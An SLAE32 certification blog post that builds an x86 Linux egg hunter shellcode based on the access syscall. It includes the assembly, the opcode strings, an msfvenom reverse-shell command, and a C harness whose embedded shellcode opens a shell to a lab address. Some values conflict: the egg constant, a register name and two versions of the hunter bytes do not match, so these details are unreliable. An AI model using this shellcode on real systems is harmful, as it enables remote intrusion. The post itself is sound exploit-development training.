---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 3 - EggHunter"
date:   2022-10-01 08:45:58 +0200
category: SLAE32
subject: Assignment 3 - EggHunter
excerpt_separator: <!--more-->
github-link: https://github.com/jeremycatelain/SLAE32-Assignments/tree/main/assignment3-EggHunter
---

###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Study about the EggHunter shellcode;
- Create a working demo of the EggHunter; 
- Should be configurable for different payload.
 
<!--more-->

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: PA-26457

###  <span style="color:#2d8fb3;"> Principal - What is an EggHunter ? </span>

The EggHunter is method used to exploit a buffer overflow vulnerability when the amount of space which could be allocated is not large enought to perform the simple buffer overflow technic by injecting directly the shellcode. Its particularity is that it is a small piece a instruction which will search into the memory for a known pattern that we were able to put somewhere into the memory (for instance in a HTML file) and execute its instructions. 


There are few conditions that an egghunter should answer :

1. It must be robust : Capable of searching anywhere into the memory and do not crash when it goes through invalids memory regions.
2. It must be small : The main requirement of the EggHunter is that it should be small enough to fit where no other payload would be able
to fit. The smaller the better.
3. And it must be fast : The searching of the known pattern should be performed as quick as possible without having to wait a long time at each exploitation.

###  <span style="color:#2d8fb3;"> Description of the exploitation </span>

#### Egg definition

The first things to do is to define the "egg" to searh for into the memory and that will inform our EggHunter that it founds the instruction to execute.
In this exercise, for this egg, we will use the 8 bytes as follows :

    00000000 90       nop 
    00000001 50       push eax 
    00000002 90       nop 
    00000003 50       push eax 
    00000004 90       nop 
    00000005 50       push eax 
    00000006 90       nop 
    00000007 50       push eax

As a raw buffer, the key becomes a dword 0x50905090 repeated twice in a row. There are 3 reason why we choosed that payload :
1. With two repeated key, it doesn't have to search for two unique keys one after the other but only to search for one repeated twice ;
2. The 8 bytes length allows to have enought uniqueness;
3. And its instructions allowed the shellcode to be directly executed without having to add more instruction to jump those 8 bytes.

The instruction in our code will be :

    mov edi, 0x50905090


#### EggHunter definition

In this paper, we will use the "access" syscall which checks whether the calling process can access a file at a specific pathname. 

    int access (const char *pathname, int mode);

The pointer in parameter "*pathname" will allow us to access to the memory value of the pointed address. And the return value of this function "EFAULT", will inform us that the pathname points outside an accessible address space. 

The decimal value of the access call is 33 as we can see :

    > cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep access
    #define __NR_access 33

So, after the initialization of the Egg's value, the next step will be to define the function that will be used to go to the next page.
Knowing that the size of a page is 4096 bytes (can be checked with the command line "getconf PAGESIZE"), we need to create a function to will jump of 4096 bytes if after checking the first address value a EFAULT error is returned. 
But, the hexadecimal value of 4096 is 0x1000 which contains a NULL so we need to create a function that will avoid null values in the shellcode. To resolve this issue, instead of jumping of 4096 bytes directly, we can create a function that jump of 4095 (0xfff in hexadecimal) and then we will increment the value by 1 afterward.

Here as follows the function :

    next_page : 
        or dx, 0xfff ; or operation to go to the next page, 4095

The next steps will be to build a function that will go though the page, first check if the address can be access with the "access" syscall, if not it will call the function next_page, and if so, it will go thought the page to search for the Egg. And, when the 4 bytes value of the egg (0x90509050) are find, the next 4 bytes will be compared as well.  

First, we create or next function that will make the syscall.

    next_address :
        inc edx ; the value become 4096 = 0x1000
        pusha ; save the current registers
        lea ebx, [edx + 0x4] ; load the address at the first address of the current page
        mov al, 0x21 ; 0x21 is the heximal value of 33
        int 0x80 ; access syscall


After the syscall, we need to check that the value returned in EAX is not a EFAULT. The EFAULT error is represented by the decimal value 14 as we can see :

    > cat /usr/include/asm-generic/errno-base.h | grep EFAULT
    #define	EFAULT		14	/* Bad address */

Which gives in binary :

    (dec) 14 : (bin) 00001110 

As we known, the return value in case of EFAULT will be in decimal -14 (-EFAULT). its hexadecimal value is obtained with the following steps :

First, we invert the bits of the 14 value which gives 241 :
    
    00001110 => 11110001 = (dec) 241

And finaly, we add 1 to it :

    11110001 + 1 = 11110010 = (dec) 242 = (hex) 0xf2

So to check if the EFAULT value is return, we need to compare EAX with 0xf2.

    cmp al, 0xf2

If the values are equals, we need to go to the next page.
    
    je short next_page

if they are not, we can verify that the value at the current address is equal the our egg (0x90509050). 

    cmp [edx], esi

if they are not equal we can jump to the next address by recurcively calling the next_address function. And if they are equals, we can then check the 4 next bytes of the egg.

    jnz next_address ; jump to the next_address if not equals
    cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)
    jnz next_address ; jump to the next address if not equals

Finally, if the 8 bytes matched, it means that the egg has been found and we can jump to the shellcode.

    jmp edx

###  <span style="color:#2d8fb3;"> C code  </span>

The final step is to define the shellcode that we want to execute. To do that, we used the msfvenom command line as follows to create a reverse tcp shellcode.

    msfvenom -p linux/x86/shell_reverse_tcp RHOST=127.0.0.1 LPORT=5555 -f c


Then, in our C script we will execute the EggHunter shellcode and then store in memory the shellcode that we want to execute with the Egg in front of it. 

To do that with the objdump command line, we retrieve the EggHunter shellcode :

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment3-EggHunter# objdump -d EggHunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
    "\x31\xc0\x89\xc6\xbe\x50\x90\x50\x90\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x74\xee\x61\x39\x32\x75\xee\x8d\x5a\x04\x39\x33\x75\xe7\xff\xe2"

We inserted the two paylaod into our C file and finally we compile our C file with the following command line :

    gcc -m32 -fno-stack-protector -z execstack -o Egg Egg_Hunter.c 

We verified our shellcode by launching on one side the netcat command line and on the other side our EggHunter executable.

<img src="/assets/slae32-img/assignment3/final.PNG" alt="drawing" style="width:100%;"/>


*Useful link:*
- <a href="https://www.secpod.com/blog/hunting-the-egg-egg-hunter/" style="color:#2d8fb3;">www.secpod.com</a>
- <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" style="color:#2d8fb3;">www.hick.org</a>
- <a href="https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf" style="color:#2d8fb3;">www.exploit-db.com</a>
- <a href="https://medium.com/@chaudharyaditya/slae-0x3-egg-hunter-shellcode-6fe367be2776#:~:text=An%20egghunter%20is%20a%20short,pass%20control%20to%20the%20shellcode" style="color:#2d8fb3;">medium.com</a>

###  <span style="color:#2d8fb3;"> Source Codes  </span>

#### Assembly code

    global _start

    section .text
    _start:

	    xor eax, eax ; initialization of the EAX register
	    mov esi, eax ; initialization of the ESI register
	
	    ; Egg initialization
	    mov esi, dword 0x50905090

    next_page : 
        or dx, 0xfff ; or operation to go to the next page, 4095


    next_address :
	    inc edx ; the value become 4096 = 0x1000
        pusha ; save the current registers
        lea ebx, [edx + 0x4] ; load the address at the first address of the current page
        mov al, 0x21 ; 0x21 is the heximal value of 33
        int 0x80 ; access syscal
	
	    cmp al, 0xf2 ; Check if the return value is a EFAULT
	    popa ; get the registers back
	    je short next_page ; in case of EFAULT, go to the next page
	
	    cmp [edx], esi ; compare the value at the address with our egg
	    jnz next_address ; jump to the next_address if not equals
	    cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)

	    jnz next_address ; jump to the next address if not equals

	    jmp edx ; jump to the shellcode if the egg is found



#### C code 

    #include <stdio.h>
    #include <string.h>

    unsigned char EggHunter [] = \
    "\x31\xc0\x89\xc6\xbe\x90\x50\x90\x50\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\xff\xe2";

    unsigned char shellcode [] = \
        "\x90\x50\x90\x50\x90\x50\x90\x50" // Egg
        "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68"
        "\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
        "\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

    main() {
        printf("Shellcode Length: %d\n", strlen(EggHunter));

        int (*ret)() = (int(*)())EggHunter;

        ret();
    }




